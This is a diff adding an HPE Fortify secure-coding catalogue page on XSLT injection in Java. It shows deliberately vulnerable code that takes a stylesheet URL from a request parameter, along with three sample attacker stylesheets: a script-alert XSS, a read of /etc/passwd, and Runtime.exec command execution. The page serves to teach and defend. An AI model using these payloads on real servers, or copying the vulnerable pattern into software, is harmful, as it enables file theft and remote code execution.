@@ -1,0 +1,68 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf8">
+<title>Software Security | Protect your Software at the Source | HPE Security Fortify</title>
+<link rel="stylesheet" href="../css/vcmain.css" type="text/css" media="screen" title="no title" charset="utf-8">
+</head>
+<script language="javascript">
+
+					if (top.location == self.location)
+					{ //if page is not in its frameset
+					//top.location.href = "/vulncat/index.html?open=" + window.location.href;
+					}
+
+				</script><!-- End of document.header.tile --><body class="level3"><div id="theWrapper">
+						<div id="theContentCenter">
+							<!-- desc.dataflow.java.xslt_injection -->						
+							<h1>
+							   XSLT Injection
+							</h1>
+							<h2>ABSTRACT</h2>
+							<p>
+							  Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary Java code.
+							</p>
+							<h2>EXPLANATION</h2>
+							<p>
+							  XSLT injection occurs when:<br><br>  1. Data enters a program from an untrusted source.<br><br>  2. The data is written to an XSL stylesheet.<br><br><br>  Applications typically use XSL stylesheet to transform XML documents from one format to another.  XSL stylesheets include special functions which enhance the transformation process but introduce additional vulnerabilities if used incorrectly.<br><br>  The semantics of XSL stylesheets and processing can be altered if an attacker has the ability to write XSL elements in a stylesheet. An attacker could alter the output of a stylesheet such that a XSS (cross-site scripting) attack was enabled, expose the contents of local file system resources, or execute arbitrary Java commands.<br><br><b>Example 1:</b> Here is some code that is vulnerable to XSLT Injection:<br><br></p>
+<pre><br>  ...<br>  InputStream xmlUrl = Utils.getFromURL(request.getParameter("xmlurl"));<br>  InputStream xsltUrl = Utils.getFromURL(request.getParameter("xslurl"));<br><br>  Source xmlSource = new StreamSource(xmlUrl);<br>  Source xsltSource = new StreamSource(xsltUrl);<br>  Result result = new StreamResult(System.out);<br><br>  TransformerFactory transFact = TransformerFactory.newInstance();<br>  Transformer trans = transFact.newTransformer(xsltSource);<br>  trans.transform(xmlSource, result);<br>  ...<br></pre>
+<br><br>  The code above results in three different exploits when the attacker can pass the identified XSL to the XSTL processor:<br><br>  1.  XSS:<br><br><code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;script&gt;alert(123)&lt;/script&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br></code><br><br>  When the XSL stylesheet is processed, the &lt;script&gt; tag is rendered to the victim's browser allowing a cross-site scripting attack to be performed.<br><br>  2.  Reading of arbitrary files on the server's file system:<br><br><code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;xsl:copy-of select="document('/etc/passwd')"/&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br></code><br><br>  The above XSL stylesheet will return the contents of the /etc/passwd file.<br><br>  3.  Execution of arbitrary Java code:<br><br>  The XSLT processor has the ability to expose native Java language methods as XSLT functions if they are not disabled.<br><br><code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;xsl:variable name="rtobject" select="rt:getRuntime()"/&gt;<br>      &lt;xsl:variable name="process" select="rt:exec($rtobject,'ls')"/&gt;<br>      &lt;xsl:variable name="processString" select="ob:toString($process)"/&gt;<br>      &lt;xsl:value-of select="$processString"/&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br></code><br><br>  The above stylesheet will execute the "ls" command run on the server.
+							
+							 								<h2>REFERENCES</h2>
+																								   <p>[1]  <em>INJECT-8: Take care interpreting untrusted code</em> Oracle<br></p>
+																									   <p>[2]  <em>INPUT-1: Validate inputs</em> Oracle<br></p>
+																									   <p>[3] Standards Mapping - Common Weakness Enumeration <em>CWE ID 494, CWE ID 631</em> <br></p>
+																									   <p>[4] Standards Mapping - FIPS200 <em>SI</em> <br></p>
+																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 <em>SI-10 Information Input Validation (P1)</em> <br></p>
+																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 <em>M7 Client Side Injection</em> <br></p>
+																									   <p>[7] Standards Mapping - OWASP Top 10 2004 <em>A6 Injection Flaws</em> <br></p>
+																									   <p>[8] Standards Mapping - OWASP Top 10 2007 <em>A2 Injection Flaws</em> <br></p>
+																									   <p>[9] Standards Mapping - OWASP Top 10 2010 <em>A1 Injection</em> <br></p>
+																									   <p>[10] Standards Mapping - OWASP Top 10 2013 <em>A1 Injection</em> <br></p>
+																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 <em>Requirement 6.5.6</em> <br></p>
+																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
+																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 <em>Requirement 6.5.1</em> <br></p>
+																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 <em>Requirement 6.5.1</em> <br></p>
+																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 <em>Requirement 6.5.1</em> <br></p>
+																									   <p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 <em>APP3510 CAT I</em> <br></p>
+																									   <p>[22] Standards Mapping - Web Application Security Consortium Version 2.00 <em>Improper Input Handling (WASC-20)</em> <br></p>
+																														<div id="theFooter">
+							<p></p>
+							<br><center>
+                                                        © Copyright 2008 - 2015 Hewlett Packard Enterprise Development Company, L.P.
+							<br>
+							(Generated from version 2015.4.0.0008 of the HPE Security Fortify Secure Coding Rulepacks)
+							<br>
+							desc.dataflow.java.xslt_injection
+							</center>
+							<p></p>
+						</div>
+</div>
+</div></body>
+</html>
+ 
